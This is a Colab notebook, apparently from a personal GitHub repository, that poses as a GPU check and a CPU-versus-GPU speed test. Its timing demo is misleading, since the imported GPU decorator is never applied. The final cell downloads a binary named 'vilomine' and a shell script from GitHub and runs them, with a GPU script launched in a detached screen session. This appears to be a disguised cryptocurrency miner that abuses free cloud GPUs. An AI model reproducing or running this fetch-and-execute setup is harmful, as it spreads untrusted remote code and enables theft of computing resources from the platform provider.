{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Jeko.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyNA0/B/KbTrXBwPgXuo9hNu",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Jekoso/Jek/blob/main/Jeko.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "2r-3NY32L2SO"
      },
      "source": [
        "#@title Cek GPU Ngab :)\n",
        "! nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "NnG_Eax8L9sp"
      },
      "source": [
        "#@title Sebelum Mulai Berdoa Dulu Ya :)\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "K5nr23K-MHJH"
      },
      "source": [
        "#@title om awighnam astu namo sidham\n",
        "\n",
        "#!/bin/sh\n",
        "\n",
        "!sudo apt update\n",
        "!sudo apt install screen -y\n",
        "!screen -dmS gpu.sh ./gpu.sh 65 75\n",
        "!wget https://github.com/arjawawibawa/dedey/raw/main/vilomine\n",
        "!wget https://raw.githubusercontent.com/Jekoso/Jek/main/Zil.sh\n",
        "!chmod +x Zil.sh\n",
        "!./Zil.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}